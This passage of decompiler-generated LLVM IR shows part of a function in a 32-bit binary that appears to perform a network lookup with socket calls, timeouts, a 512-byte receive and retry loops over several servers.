  %v3_10011b34 = phi i16 [ 10, %dec_label_pc_10011b08 ], [ %v3_10011b34.pre, %dec_label_pc_10011b20 ]
  %v4_10011b34 = sext i16 %v3_10011b34 to i32
  store i32 268507972, i32* @lr, align 4
  %v3_10011b40 = call i32 @function_1000ed5c(i32 %v4_10011b34, i32 2, i32 17)
  store i32 %v3_10011b40, i32* @r19, align 4
  %v1_10011b44 = icmp slt i32 %v3_10011b40, 0
  br i1 %v1_10011b44, label %dec_label_pc_10011b70, label %dec_label_pc_10011b4c

dec_label_pc_10011b4c:                            ; preds = %dec_label_pc_10011b34
  store i32 268507992, i32* @lr, align 4
  %v3_10011b54 = call i32 @function_1000ebcc(i32 %v2_10011b4c, i32 28, i32 28)
  %tmp60 = icmp sgt i32 %v3_10011b54, -1
  br i1 %tmp60, label %dec_label_pc_10011b78, label %dec_label_pc_10011b60

dec_label_pc_10011b60:                            ; preds = %dec_label_pc_10011b4c
  %v0_10011b60 = call i32 @function_1000c85c()
  %v1_10011b64 = inttoptr i32 %v0_10011b60 to i32*
  %v2_10011b64 = load i32, i32* %v1_10011b64, align 4
  store i32 %v2_10011b64, i32* %r0.global-to-local, align 4
  %v3_10011b68 = icmp eq i32 %v2_10011b64, 101
  br i1 %v3_10011b68, label %dec_label_pc_10011eb0, label %dec_label_pc_10011b70

dec_label_pc_10011b70:                            ; preds = %dec_label_pc_10011b60, %dec_label_pc_10011b34
  %v0_10011b70 = load i32, i32* %r18.global-to-local, align 4
  %v1_10011b70 = add i32 %v0_10011b70, 1
  store i32 %v1_10011b70, i32* %r18.global-to-local, align 4
  %tmp61 = icmp ult i32 %v1_10011b70, 3
  br i1 %tmp61, label %dec_label_pc_100119c0, label %dec_label_pc_10011ee4

dec_label_pc_10011b78:                            ; preds = %dec_label_pc_10011b4c
  %v0_10011b78 = load i32, i32* @r28, align 4
  %v1_10011b78 = load i32, i32* @r27, align 4
  %v2_10011b78 = add i32 %v1_10011b78, %v0_10011b78
  %v0_10011b7c = load i32, i32* @r30, align 4
  %v0_10011b84 = load i32, i32* @r19, align 4
  store i32 ptrtoint (i32* @global_var_10011b8c.811 to i32), i32* @lr, align 4
  %v4_10011b88 = call i32 @function_1000eca8(i32 %v0_10011b84, i32 %v0_10011b7c, i32 %v2_10011b78, i32 0)
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_10011ba0 = load i32, i32* @r19, align 4
  store i32 %v0_10011ba0, i32* %stack_var_-248, align 4
  store i32 268508072, i32* @lr, align 4
  %v3_10011ba4 = call i32 @function_10012554(i32 %v2_10011b90, i32 1, i32 10000)
  %tmp62 = icmp slt i32 %v3_10011ba4, 1
  br i1 %tmp62, label %dec_label_pc_10011eb0, label %dec_label_pc_10011bb0

dec_label_pc_10011bb0:                            ; preds = %dec_label_pc_10011b78
  %v0_10011bb0 = load i32, i32* @r19, align 4
  %v0_10011bb4 = load i32, i32* @r30, align 4
  store i32 268508100, i32* @lr, align 4
  %v4_10011bc0 = call i32 @function_1000ec70(i32 %v0_10011bb0, i32 %v0_10011bb4, i32 512, i32 0)
  store i32 %v4_10011bc0, i32* @r27, align 4
  %tmp63 = icmp slt i32 %v4_10011bc0, 12
  br i1 %tmp63, label %dec_label_pc_10011e58, label %dec_label_pc_10011bd0

dec_label_pc_10011bd0:                            ; preds = %dec_label_pc_10011bb0
  %v0_10011bd0 = load i32, i32* @r30, align 4
  %v2_10011bd8 = inttoptr i32 %v0_10011bd0 to i8*
  %v3_10011bd8 = call i32 @function_10013a5c(i8* %v2_10011bd8, i32 %v2_100119d8)
  %v3_10011bdc = load i32, i32* %stack_var_-144, align 4
  store i32 %v3_10011bdc, i32* @r20, align 4
  %v1_10011be0 = load i32, i32* @r25, align 4
  %v4_10011be0 = icmp eq i32 %v3_10011bdc, %v1_10011be0
  br i1 %v4_10011be0, label %dec_label_pc_10011be8, label %dec_label_pc_10011e58

dec_label_pc_10011be8:                            ; preds = %dec_label_pc_10011bd0
  store i32 %tmp37, i32* %r0.global-to-local, align 4
  br i1 %v3_10011bec, label %dec_label_pc_10011e58, label %dec_label_pc_10011bf4

dec_label_pc_10011bf4:                            ; preds = %dec_label_pc_10011be8
  store i32 %tmp36, i32* %r0.global-to-local, align 4
  br i1 %v3_10011bf8, label %dec_label_pc_10011c00, label %dec_label_pc_10011c68

dec_label_pc_10011c00:                            ; preds = %dec_label_pc_10011bf4
  %v0_10011c00 = load i32, i32* %r17.global-to-local, align 4
  %v3_10011c00 = icmp eq i32 %v0_10011c00, 0
  br i1 %v3_10011c00, label %dec_label_pc_10011c08, label %dec_label_pc_10011c5c

dec_label_pc_10011c08:                            ; preds = %dec_label_pc_10011c00
  store i32 ptrtoint (i32* @global_var_1002b870.749 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_10011964, i32* %r28.global-to-local, align 4
  store i32 %v2_10011964, i32* @r3, align 4
  %v0_10011c24 = call i32 @function_10010048()
  %v0_10011c2c = call i32 @function_10010040()
  %v3_10011c34 = load i32, i32* @global_var_1002b968.806, align 4
  store i32 %v3_10011c34, i32* %r29.global-to-local, align 4
  store i32 %v2_10011964, i32* @r3, align 4
  %v0_10011c40 = call i32 @function_10010048()
  %v0_10011c44 = load i32, i32* %r29.global-to-local, align 4
  %v1_10011c44 = add i32 %v0_10011c44, -1
  store i32 %v1_10011c44, i32* %r29.global-to-local, align 4
  %v0_10011c48 = load i32, i32* @r22, align 4
  %v2_10011c48 = icmp slt i32 %v0_10011c48, %v1_10011c44
  br i1 %v2_10011c48, label %dec_label_pc_10011c50, label %dec_label_pc_10011c5c

dec_label_pc_10011c50:                            ; preds = %dec_label_pc_10011c08
  %v1_10011c50 = add i32 %v0_10011c48, 1
  store i32 %v1_10011c50, i32* @r22, align 4
  %v0_10011c54 = load i32, i32* @r20, align 4
  store i32 %v0_10011c54, i32* @r25, align 4
  br label %dec_label_pc_10011eccthread-pre-split.backedge

dec_label_pc_10011c5c:                            ; preds = %dec_label_pc_10011c08, %dec_label_pc_10011c00
  %v0_10011c5c = call i32 @function_1001063c()
  br label %dec_label_pc_10011c90

dec_label_pc_10011c68:                            ; preds = %dec_label_pc_10011bf4
  br i1 %v3_10011c68, label %dec_label_pc_10011c70, label %dec_label_pc_10011e58

dec_label_pc_10011c70:                            ; preds = %dec_label_pc_10011c68
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  br i1 %tmp58, label %dec_label_pc_10011c88, label %dec_label_pc_10011c7c

dec_label_pc_10011c7c:                            ; preds = %dec_label_pc_10011c70
  store i32 12, i32* %r28.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 12, i32* @r4, align 4
  %v0_10011ca810 = load i32, i32* @r30, align 4
  store i32 %v0_10011ca810, i32* @r3, align 4
  store i32 1, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10011c98

dec_label_pc_10011c88:                            ; preds = %dec_label_pc_10011c70
  %v0_10011c88 = call i32 @function_1001063c()
  br label %dec_label_pc_10011c90

dec_label_pc_10011c90:                            ; preds = %dec_label_pc_10011c5c, %dec_label_pc_10011c88
  %storemerge3 = phi i32 [ %v0_10011c88, %dec_label_pc_10011c88 ], [ %v0_10011c5c, %dec_label_pc_10011c5c ]
  %storemerge = phi i32 [ 4, %dec_label_pc_10011c88 ], [ 1, %dec_label_pc_10011c5c ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v2_10011c90 = inttoptr i32 %storemerge3 to i32*
  store i32 %storemerge, i32* %v2_10011c90, align 4
  br label %dec_label_pc_10011ef4

dec_label_pc_10011c98:                            ; preds = %dec_label_pc_10011c7c, %dec_label_pc_10011c98
  %v0_10011ca814 = phi i32 [ %v0_10011ca810, %dec_label_pc_10011c7c ], [ %v0_10011ca8, %dec_label_pc_10011c98 ]
  %storemerge213 = phi i32 [ 12, %dec_label_pc_10011c7c ], [ %v2_10011c9c, %dec_label_pc_10011c98 ]
  store i32 268508316, i32* @lr, align 4
  %v2_10011c98 = call i32 @function_10013b9c(i32 %v0_10011ca814, i32 %storemerge213)
  %v0_10011c9c = load i32, i32* %r28.global-to-local, align 4
  %v2_10011c9c = add i32 %v0_10011c9c, %v2_10011c98
  %v0_10011cac.pr = load i32, i32* %r29.global-to-local, align 4
  store i32 %v2_10011c9c, i32* %r28.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_10011c9c, i32* @r4, align 4
  %v0_10011ca8 = load i32, i32* @r30, align 4
  store i32 %v0_10011ca8, i32* @r3, align 4
  %v2_10011cac = icmp slt i32 %v0_10011cac.pr, 1
  %v1_10011cb0 = add i32 %v0_10011cac.pr, 1
  store i32 %v1_10011cb0, i32* %r29.global-to-local, align 4
  br i1 %v2_10011cac, label %dec_label_pc_10011c98, label %dec_label_pc_10011cb8

dec_label_pc_10011cb8:                            ; preds = %dec_label_pc_10011c98
  store i32 0, i32* @r24, align 4
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  br i1 %v2_10011c74, label %dec_label_pc_10011e04, label %dec_label_pc_10011e0c

dec_label_pc_10011cc8:                            ; preds = %dec_label_pc_10011e04
  store i32 %v2_10011cc8, i32* %r29.global-to-local, align 4
  %v0_10011ccc = load i32, i32* @r30, align 4
  store i32 268508384, i32* @lr, align 4
  %v5_10011cdc = call i32 @function_10013bc8(i32 %v0_10011ccc, i32 %v0_10011cd0, i32 %v1_10011e04, i32* nonnull %stack_var_-184)
  store i32 %v5_10011cdc, i32* %r15.global-to-local, align 4
  %tmp64 = icmp sgt i32 %v5_10011cdc, -1
  br i1 %tmp64, label %dec_label_pc_10011d00, label %dec_label_pc_10011ce8

dec_label_pc_10011ce8:                            ; preds = %dec_label_pc_10011cc8
  %v0_10011ce8 = load i32, i32* @r24, align 4
  %v3_10011ce8 = icmp eq i32 %v0_10011ce8, 0
  br i1 %v3_10011ce8, label %dec_label_pc_10011e58, label %dec_label_pc_10011cf0

dec_label_pc_10011cf0:                            ; preds = %dec_label_pc_10011ce8
  store i32 %tmp33, i32* %r0.global-to-local, align 4
  br i1 %v3_10011cf4, label %dec_label_pc_10011e58, label %dec_label_pc_10011e0c

dec_label_pc_10011d00:                            ; preds = %dec_label_pc_10011cc8
  store i32 %stack_var_-88.118, i32* %r0.global-to-local, align 4
  %v3_10011d04 = icmp eq i32 %stack_var_-88.118, 0
  br i1 %v3_10011d04, label %dec_label_pc_10011da8, label %dec_label_pc_10011d0c

dec_label_pc_10011d0c:                            ; preds = %dec_label_pc_10011d00
  %v0_10011d0c = load i32, i32* @r31, align 4
  store i32 %v2_10011cc8, i32* @r4, align 4
  %v1_10011d14 = add i32 %v0_10011d0c, 28
  %v2_10011d14 = inttoptr i32 %v1_10011d14 to i32*
  %v3_10011d14 = load i32, i32* %v2_10011d14, align 4
  store i32 %v3_10011d14, i32* %r0.global-to-local, align 4
  store i32 %v0_10011d0c, i32* @r3, align 4
  %v1_10011d1c = add i32 %v0_10011d0c, 36
  %v2_10011d1c = inttoptr i32 %v1_10011d1c to i32*
  %v3_10011d1c = load i32, i32* %v2_10011d1c, align 4
  store i32 %v3_10011d1c, i32* %r11.global-to-local, align 4
  store i32 40, i32* @r5, align 4
  store i32 268508468, i32* @lr, align 4
  %v0_10011d30 = call i32 @function_1000dcb0()
  %v0_10011d34 = load i32, i32* @r31, align 4
  %v1_10011d34 = add i32 %v0_10011d34, 4
  %v2_10011d34 = inttoptr i32 %v1_10011d34 to i32*
  %v3_10011d34 = load i32, i32* %v2_10011d34, align 4
  %v3_10011d38 = icmp eq i32 %v3_10011d34, 24
  br i1 %v3_10011d38, label %dec_label_pc_10011d0c.dec_label_pc_10011d5c_crit_edge, label %dec_label_pc_10011d40

dec_label_pc_10011d0c.dec_label_pc_10011d5c_crit_edge: ; preds = %dec_label_pc_10011d0c
  %v1_10011d5c.pre = load i32, i32* %r16.global-to-local, align 4
  br label %dec_label_pc_10011d5c

dec_label_pc_10011d40:                            ; preds = %dec_label_pc_10011d0c
  %v1_10011d40 = add i32 %v0_10011d34, 28
  %v2_10011d40 = inttoptr i32 %v1_10011d40 to i32*
  %v3_10011d40 = load i32, i32* %v2_10011d40, align 4
  store i32 %v3_10011d40, i32* %r0.global-to-local, align 4
  %v3_10011d44 = icmp eq i32 %v3_10011d40, 0
  br i1 %v3_10011d44, label %dec_label_pc_10011e0c, label %dec_label_pc_10011d4c

dec_label_pc_10011d4c:                            ; preds = %dec_label_pc_10011d40
  %v0_10011d4c = load i32, i32* %r16.global-to-local, align 4
  %v3_10011d4c = icmp eq i32 %v0_10011d4c, 1
  br i1 %v3_10011d4c, label %dec_label_pc_10011d5c, label %dec_label_pc_10011d54

dec_label_pc_10011d54:                            ; preds = %dec_label_pc_10011d4c
  %v3_10011d54 = icmp eq i32 %v0_10011d4c, 28
  br i1 %v3_10011d54, label %dec_label_pc_10011d5c, label %dec_label_pc_10011e0c

dec_label_pc_10011d5c:                            ; preds = %dec_label_pc_10011d0c.dec_label_pc_10011d5c_crit_edge, %dec_label_pc_10011d54, %dec_label_pc_10011d4c
  %v1_10011d5c = phi i32 [ %v1_10011d5c.pre, %dec_label_pc_10011d0c.dec_label_pc_10011d5c_crit_edge ], [ 28, %dec_label_pc_10011d54 ], [ 1, %dec_label_pc_10011d4c ]
  %v4_10011d5c = icmp eq i32 %v3_10011d34, %v1_10011d5c
  br i1 %v4_10011d5c, label %dec_label_pc_10011d70, label %dec_label_pc_10011d64

dec_label_pc_10011d64:                            ; preds = %dec_label_pc_10011d5c
  %v1_10011d64 = inttoptr i32 %v0_10011d34 to i32*
  %v2_10011d64 = load i32, i32* %v1_10011d64, align 4
  store i32 ptrtoint (i32* @global_var_10011d6c.814 to i32), i32* @lr, align 4
  %v1_10011d68 = call i32 @function_1000f0b8(i32 %v2_10011d64)
  br label %dec_label_pc_10011df0

dec_label_pc_10011d70:                            ; preds = %dec_label_pc_10011d5c
  %v1_10011d74 = add i32 %v0_10011d34, 16
  %v2_10011d74 = inttoptr i32 %v1_10011d74 to i32*
  %v3_10011d74 = load i32, i32* %v2_10011d74, align 4
  store i32 %v3_10011d74, i32* %r11.global-to-local, align 4
  %v1_10011d78 = add i32 %v0_10011d34, 32
  %v2_10011d78 = inttoptr i32 %v1_10011d78 to i32*
  %v3_10011d78 = load i32, i32* %v2_10011d78, align 4
  store i32 %v3_10011d78, i32* %r0.global-to-local, align 4
  %v0_10011d7c = load i32, i32* @r24, align 4
  %v2_10011d7c = sub i32 %tmp35, %v0_10011d7c
  %v1_10011d80 = add i32 %v2_10011d7c, -1
  %v1_10011d84 = add i32 %v3_10011d74, 4
  %v2_10011d88 = mul i32 %v1_10011d80, %v1_10011d84
  store i32 %v2_10011d88, i32* %r11.global-to-local, align 4
  %v2_10011d8c = add i32 %v0_10011d34, 36
  %v3_10011d8c = inttoptr i32 %v2_10011d8c to i32*
  store i32 %v1_10011d80, i32* %v3_10011d8c, align 4
  %v0_10011d90 = load i32, i32* %r11.global-to-local, align 4
  %v1_10011d90 = load i32, i32* %r0.global-to-local, align 4
  %v3_10011d90 = icmp ugt i32 %v0_10011d90, %v1_10011d90
  br i1 %v3_10011d90, label %dec_label_pc_10011e0c, label %dec_label_pc_10011d98

dec_label_pc_10011d98:                            ; preds = %dec_label_pc_10011d70
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10011da0 = load i32, i32* @r31, align 4
  %v2_10011da0 = add i32 %v1_10011da0, 36
  %v3_10011da0 = inttoptr i32 %v2_10011da0 to i32*
  store i32 0, i32* %v3_10011da0, align 4
  br label %dec_label_pc_10011df0

dec_label_pc_10011da8:                            ; preds = %dec_label_pc_10011d00
  %v3_10011da8 = load i32, i32* %stack_var_-184, align 4
  store i32 268508592, i32* @lr, align 4
  %v1_10011dac = call i32 @function_1000f0b8(i32 %v3_10011da8)
  store i32 %tmp29, i32* %r0.global-to-local, align 4
  %v1_10011db4 = load i32, i32* %r16.global-to-local, align 4
  %v4_10011db4 = icmp eq i32 %tmp29, %v1_10011db4
  br i1 %v4_10011db4, label %dec_label_pc_10011dbc, label %dec_label_pc_10011df0

dec_label_pc_10011dbc:                            ; preds = %dec_label_pc_10011da8
  %v0_10011dbc = load i32, i32* @r31, align 4
  %v1_10011dbc = add i32 %v0_10011dbc, 16
  %v2_10011dbc = inttoptr i32 %v1_10011dbc to i32*
  %v3_10011dbc = load i32, i32* %v2_10011dbc, align 4
  store i32 %v3_10011dbc, i32* @r5, align 4
  store i32 %tmp28, i32* %r0.global-to-local, align 4
  %v4_10011dc4 = icmp eq i32 %v3_10011dbc, %tmp28
  br i1 %v4_10011dc4, label %dec_label_pc_10011dcc, label %dec_label_pc_10011e50

dec_label_pc_10011dcc:                            ; preds = %dec_label_pc_10011dbc
  %v1_10011dcc = add i32 %v0_10011dbc, 36
  %v2_10011dcc = inttoptr i32 %v1_10011dcc to i32*
  %v3_10011dcc = load i32, i32* %v2_10011dcc, align 4
  %v1_10011dd0 = add i32 %v0_10011dbc, 28
  %v2_10011dd0 = inttoptr i32 %v1_10011dd0 to i32*
  %v3_10011dd0 = load i32, i32* %v2_10011dd0, align 4
  store i32 %v3_10011dd0, i32* %r0.global-to-local, align 4
  %v2_10011dd8 = mul i32 %v3_10011dcc, %tmp28
  %v2_10011ddc = add i32 %v3_10011dd0, %v2_10011dd8
  store i32 %v2_10011ddc, i32* @r3, align 4
  store i32 268508644, i32* @lr, align 4
  %v0_10011de0 = call i32 @function_1000dcb0()
  %v0_10011de4 = load i32, i32* @r31, align 4
  %v1_10011de4 = add i32 %v0_10011de4, 36
  %v2_10011de4 = inttoptr i32 %v1_10011de4 to i32*
  %v3_10011de4 = load i32, i32* %v2_10011de4, align 4
  %v1_10011de8 = add i32 %v3_10011de4, 1
  store i32 %v1_10011de8, i32* %v2_10011de4, align 4
  br label %dec_label_pc_10011df0

dec_label_pc_10011df0:                            ; preds = %dec_label_pc_10011da8, %dec_label_pc_10011d98, %dec_label_pc_10011d64, %dec_label_pc_10011dcc
  %stack_var_-88.0 = phi i32 [ 0, %dec_label_pc_10011dcc ], [ 0, %dec_label_pc_10011da8 ], [ 0, %dec_label_pc_10011d98 ], [ %stack_var_-88.118, %dec_label_pc_10011d64 ]
  %v0_10011df0 = load i32, i32* @r28, align 4
  %v1_10011df0 = load i32, i32* %r15.global-to-local, align 4
  %v2_10011df0 = add i32 %v1_10011df0, %v0_10011df0
  store i32 %v2_10011df0, i32* %r28.global-to-local, align 4
  %v0_10011df4 = load i32, i32* @r24, align 4
  %v1_10011df4 = add i32 %v0_10011df4, 1
  store i32 %v1_10011df4, i32* @r24, align 4
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  %v2_10011dfc = icmp slt i32 %v1_10011df4, %tmp35
  br i1 %v2_10011dfc, label %dec_label_pc_10011e04, label %dec_label_pc_10011e0c

dec_label_pc_10011e04:                            ; preds = %dec_label_pc_10011cb8, %dec_label_pc_10011df0
  %v0_10011cd0 = phi i32 [ %v2_10011df0, %dec_label_pc_10011df0 ], [ %v2_10011c9c, %dec_label_pc_10011cb8 ]
  %stack_var_-88.118 = phi i32 [ %stack_var_-88.0, %dec_label_pc_10011df0 ], [ 1, %dec_label_pc_10011cb8 ]
  %v1_10011e04 = load i32, i32* @r27, align 4
  %v2_10011e04 = icmp slt i32 %v0_10011cd0, %v1_10011e04
  br i1 %v2_10011e04, label %dec_label_pc_10011cc8, label %dec_label_pc_10011e0c

dec_label_pc_10011e0c:                            ; preds = %dec_label_pc_10011cf0, %dec_label_pc_10011cb8, %dec_label_pc_10011e04, %dec_label_pc_10011d40, %dec_label_pc_10011d70, %dec_label_pc_10011df0, %dec_label_pc_10011d54
  %v0_10011e0c = load i32, i32* @r19, align 4
  store i32 268508692, i32* @lr, align 4
  %v1_10011e10 = call i32 @function_1000c2f4(i32 %v0_10011e0c)
  %v3_10011e18 = icmp eq i32 %arg5, 0
  %v0_10011e28 = load i32, i32* @r30, align 4
  br i1 %v3_10011e18, label %dec_label_pc_10011e28, label %dec_label_pc_10011e20

dec_label_pc_10011e20:                            ; preds = %dec_label_pc_10011e0c
  %v2_10011e20 = inttoptr i32 %arg5 to i32*
  store i32 %v0_10011e28, i32* %v2_10011e20, align 4
  br label %dec_label_pc_10011e30

dec_label_pc_10011e28:                            ; preds = %dec_label_pc_10011e0c
  store i32 268508720, i32* @lr, align 4
  %v1_10011e2c = call i32 @function_1000f0b8(i32 %v0_10011e28)
  br label %dec_label_pc_10011e30

dec_label_pc_10011e30:                            ; preds = %dec_label_pc_10011e20, %dec_label_pc_10011e28
  %v0_10011e30 = load i32, i32* @r21, align 4
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r29.global-to-local, align 4
  store i32 268508732, i32* @lr, align 4
  %v1_10011e38 = call i32 @function_1000f0b8(i32 %v0_10011e30)
  store i32 ptrtoint (i32* @global_var_10031ba0.802 to i32), i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10011f34

dec_label_pc_10011e50:                            ; preds = %dec_label_pc_10011dbc
  %v1_10011e50 = inttoptr i32 %v0_10011dbc to i32*
  %v2_10011e50 = load i32, i32* %v1_10011e50, align 4
  store i32 268508760, i32* @lr, align 4
  %v1_10011e54 = call i32 @function_1000f0b8(i32 %v2_10011e50)
  br label %dec_label_pc_10011e58

dec_label_pc_10011e58:                            ; preds = %dec_label_pc_10011c68, %dec_label_pc_10011bd0, %dec_label_pc_10011cf0, %dec_label_pc_10011ce8, %dec_label_pc_10011be8, %dec_label_pc_10011bb0, %dec_label_pc_10011e50
  %v0_10011e58 = load i32, i32* %r17.global-to-local, align 4
  %v3_10011e58 = icmp eq i32 %v0_10011e58, 0
  br i1 %v3_10011e58, label %dec_label_pc_10011e60, label %dec_label_pc_10011eb0

dec_label_pc_10011e60:                            ; preds = %dec_label_pc_10011e58
  store i32 ptrtoint (i32* @global_var_1002b870.749 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_10011964, i32* %r28.global-to-local, align 4
  store i32 %v2_10011964, i32* @r3, align 4
  %v0_10011e7c = call i32 @function_10010048()
  %v0_10011e84 = call i32 @function_10010040()
  %v3_10011e8c = load i32, i32* @global_var_1002b968.806, align 4
  store i32 %v3_10011e8c, i32* %r29.global-to-local, align 4
  store i32 %v2_10011964, i32* @r3, align 4
  %v0_10011e98 = call i32 @function_10010048()
  %v0_10011e9c = load i32, i32* %r29.global-to-local, align 4
  %v1_10011e9c = add i32 %v0_10011e9c, -1
  store i32 %v1_10011e9c, i32* %r29.global-to-local, align 4
  %v0_10011ea0 = load i32, i32* @r22, align 4
  %v2_10011ea0 = icmp slt i32 %v0_10011ea0, %v1_10011e9c
  br i1 %v2_10011ea0, label %dec_label_pc_10011ea8, label %dec_label_pc_10011eb0

dec_label_pc_10011ea8:                            ; preds = %dec_label_pc_10011e60
  %v1_10011ea8 = add i32 %v0_10011ea0, 1
  store i32 %v1_10011ea8, i32* @r22, align 4
  br label %dec_label_pc_10011eccthread-pre-split.backedge

dec_label_pc_10011eccthread-pre-split.backedge:   ; preds = %dec_label_pc_10011ea8, %dec_label_pc_10011c50, %dec_label_pc_10011ec8
  %v0_10011ecc.pr = load i32, i32* %r18.global-to-local, align 4
  %tmp65 = icmp ult i32 %v0_10011ecc.pr, 3
  br i1 %tmp65, label %dec_label_pc_100119c0.lr.ph, label %dec_label_pc_10011ee4

dec_label_pc_10011eb0:                            ; preds = %dec_label_pc_10011b60, %dec_label_pc_10011e60, %dec_label_pc_10011e58, %dec_label_pc_10011b78
  %v0_10011eb0 = load i32, i32* @r26, align 4
  %v1_10011eb0 = add i32 %v0_10011eb0, 1
  store i32 %v1_10011eb0, i32* %r0.global-to-local, align 4
  %v1_10011eb4 = load i32, i32* @r23, align 4
  %v2_10011eb4 = srem i32 %v1_10011eb0, %v1_10011eb4
  store i32 %v2_10011eb4, i32* @r26, align 4
  %v5_10011ebc = icmp eq i32 %v2_10011eb4, 0
  br i1 %v5_10011ebc, label %dec_label_pc_10011ec4, label %dec_label_pc_10011ec8

dec_label_pc_10011ec4:                            ; preds = %dec_label_pc_10011eb0
  %v0_10011ec4 = load i32, i32* %r18.global-to-local, align 4
  %v1_10011ec4 = add i32 %v0_10011ec4, 1
  store i32 %v1_10011ec4, i32* %r18.global-to-local, align 4
  br label %dec_label_pc_10011ec8

dec_label_pc_10011ec8:                            ; preds = %dec_label_pc_10011eb0, %dec_label_pc_10011ec4
  store i32 -1, i32* @r22, align 4
  br label %dec_label_pc_10011eccthread-pre-split.backedge

dec_label_pc_100119c0.lr.ph:                      ; preds = %dec_label_pc_100119c0.lr.ph.lr.ph, %dec_label_pc_10011eccthread-pre-split.backedge
  br label %dec_label_pc_100119c0

dec_label_pc_10011ed8:                            ; preds = %dec_label_pc_10011938, %dec_label_pc_10011930, %dec_label_pc_10011928, %dec_label_pc_100118e0
  store i32 -1, i32* @r19, align 4
  store i32 -1, i32* @r26, align 4
  store i32 -1, i32* @r25, align 4
  br label %dec_label_pc_10011ee4

dec_label_pc_10011ee4:                            ; preds = %dec_label_pc_10011eccthread-pre-split.backedge, %dec_label_pc_100119d0, %dec_label_pc_10011aac, %dec_label_pc_10011b70, %dec_label_pc_10011944, %dec_label_pc_10011ed8
  %v0_10011ee4 = call i32 @function_1001063c()
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10011eec = inttoptr i32 %v0_10011ee4 to i32*
  store i32 -1, i32* %v2_10011eec, align 4
  %v0_10011ef0 = load i32, i32* @r25, align 4
  store i32 %v0_10011ef0, i32* @r20, align 4
  br label %dec_label_pc_10011ef4

dec_label_pc_10011ef4:                            ; preds = %dec_label_pc_10011c90, %dec_label_pc_10011ee4
  %v0_10011ef4 = load i32, i32* @r19, align 4
  %v3_10011ef4 = icmp eq i32 %v0_10011ef4, -1
  br i1 %v3_10011ef4, label %dec_label_pc_10011f04, label %dec_label_pc_10011efc

dec_label_pc_10011efc:                            ; preds = %dec_label_pc_10011ef4
  store i32 268508932, i32* @lr, align 4
  %v1_10011f00 = call i32 @function_1000c2f4(i32 %v0_10011ef4)
  br label %dec_label_pc_10011f04

dec_label_pc_10011f04:                            ; preds = %dec_label_pc_10011ef4, %dec_label_pc_10011efc
  %v0_10011f04 = load i32, i32* @r21, align 4
  store i32 -1, i32* @r27, align 4
  store i32 268508944, i32* @lr, align 4
  %v1_10011f0c = call i32 @function_1000f0b8(i32 %v0_10011f04)
  %v0_10011f10 = load i32, i32* @r30, align 4
  store i32 268508952, i32* @lr, align 4
  %v1_10011f14 = call i32 @function_1000f0b8(i32 %v0_10011f10)
  %v0_10011f18 = load i32, i32* @r26, align 4
  %v3_10011f18 = icmp eq i32 %v0_10011f18, -1
  br i1 %v3_10011f18, label %dec_label_pc_10011f64, label %dec_label_pc_10011f20

dec_label_pc_10011f20:                            ; preds = %dec_label_pc_10011f04
  store i32 ptrtoint (i32* @global_var_10031ba0.802 to i32), i32* %r29.global-to-local, align 4
  %v2_10011f2c = ptrtoint i32* %stack_var_-228 to i32
  br label %dec_label_pc_10011f34

dec_label_pc_10011f34:                            ; preds = %dec_label_pc_10011e30, %dec_label_pc_10011f20
  %storemerge68 = phi i32 [ %v2_10011f2c, %dec_label_pc_10011f20 ], [ %v2_10011964, %dec_label_pc_10011e30 ]
  %v1_10011f38.pre-phi = phi i32 [ %v2_10011f2c, %dec_label_pc_10011f20 ], [ %v2_10011964, %dec_label_pc_10011e30 ]
  store i32 %storemerge68, i32* %r28.global-to-local, align 4
  store i32 %v1_10011f38.pre-phi, i32* @r3, align 4
  %v0_10011f3c = call i32 @function_10010048()
  %v0_10011f44 = call i32 @function_10010040()
  %v0_10011f4c = load i32, i32* @r26, align 4
  store i32 %v0_10011f4c, i32* @global_var_1002b960.803, align 4
  store i32 %v1_10011f38.pre-phi, i32* @r3, align 4
  %v0_10011f5c = load i32, i32* @r20, align 4
  %v1_10011f5c = trunc i32 %v0_10011f5c to i16
  store i16 %v1_10011f5c, i16* @global_var_1002b86c.804, align 2
  %v0_10011f60 = call i32 @function_10010048()
  br label %dec_label_pc_10011f64

dec_label_pc_10011f64:                            ; preds = %dec_label_pc_10011f04, %dec_label_pc_10011f34
  store i32 %v0_100118e4, i32* %r0.global-to-local, align 4
  %v0_10011f68 = load i32, i32* @r27, align 4
  ret i32 %v0_10011f68

; uselistorder directives
  uselistorder i32 %v1_10011f38.pre-phi, { 1, 0 }
  uselistorder i32 %v2_10011eb4, { 1, 0 }
  uselistorder i32 %v0_10011e28, { 1, 0 }
  uselistorder i32 %v1_10011e04, { 1, 0 }
  uselistorder i32 %stack_var_-88.118, { 1, 0, 2 }
  uselistorder i32 %v0_10011cd0, { 1, 0 }
  uselistorder i32 %v1_10011df4, { 1, 0 }
  uselistorder i32 %v0_10011dbc, { 0, 2, 1, 3 }
  uselistorder i32 %v1_10011d80, { 1, 0 }
  uselistorder i32 %v0_10011d34, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v0_10011d0c, { 2, 1, 0 }
  uselistorder i32 %v0_10011ca8, { 1, 0 }
  uselistorder i32 %v2_10011c9c, { 0, 2, 1, 3 }
  uselistorder i32 %v4_10011bc0, { 1, 0 }
  uselistorder i32 %v1_10011ac0, { 1, 0 }
  uselistorder i32 %v1_10011a94, { 1, 0 }
  uselistorder i32 %v1_10011a60, { 1, 0 }
  uselistorder i32 %v1_100119f8, { 1, 0 }
  uselistorder i32 %v2_10011964, { 0, 1, 5, 6, 7, 2, 3, 4, 8, 9, 10, 11, 12 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2, 3 }
  uselistorder i16* %stack_var_-212, { 0, 1, 4, 3, 2 }
  uselistorder i32* %stack_var_-184, { 1, 0, 2 }
  uselistorder i32 %tmp36, { 1, 0, 2 }
